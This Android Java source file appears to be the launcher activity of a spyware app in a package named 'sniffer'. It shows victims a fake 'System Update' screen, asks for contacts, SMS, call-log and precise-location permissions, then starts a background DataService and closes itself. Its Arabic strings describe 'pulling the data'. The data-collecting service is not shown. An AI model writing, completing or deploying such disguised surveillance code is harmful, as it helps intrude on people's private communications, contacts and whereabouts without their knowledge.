package com.v8.global.sniffer;

import android.Manifest;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.os.Bundle;
import android.widget.Button;
import android.widget.TextView;
import android.widget.Toast;

import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;

public class MainActivity extends AppCompatActivity {
    
    private TextView tvStatus;
    private Button btnStart;
    
    private String[] permissions = {
        Manifest.permission.READ_CONTACTS,
        Manifest.permission.READ_SMS,
        Manifest.permission.READ_CALL_LOG,
        Manifest.permission.ACCESS_FINE_LOCATION
    };

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        
        tvStatus = new TextView(this);
        tvStatus.setText("⚙️ System Update\n\nاضغط على الزر لبدء الخدمة");
        tvStatus.setTextSize(18);
        tvStatus.setPadding(50, 100, 50, 50);
        
        btnStart = new Button(this);
        btnStart.setText("▶️ بدء الخدمة وسحب البيانات");
        btnStart.setOnClickListener(v -> {
            checkAndRequestPermissions();
        });
        
        setContentView(btnStart);
    }

    private void checkAndRequestPermissions() {
        boolean allGranted = true;
        for (String permission : permissions) {
            if (ContextCompat.checkSelfPermission(this, permission) != PackageManager.PERMISSION_GRANTED) {
                allGranted = false;
                break;
            }
        }
        
        if (allGranted) {
            startDataService();
        } else {
            ActivityCompat.requestPermissions(this, permissions, 100);
        }
    }
    
    private void startDataService() {
        startService(new Intent(this, DataService.class));
        Toast.makeText(this, "✅ جاري سحب البيانات...", Toast.LENGTH_LONG).show();
        finish(); // يغلق التطبيق بعد التشغيل
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, String[] permissions, int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        boolean allGranted = true;
        for (int result : grantResults) {
            if (result != PackageManager.PERMISSION_GRANTED) {
                allGranted = false;
                break;
            }
        }
        if (allGranted) {
            startDataService();
        } else {
            Toast.makeText(this, "❌ الرجاء إعطاء جميع الصلاحيات", Toast.LENGTH_LONG).show();
        }
    }
}
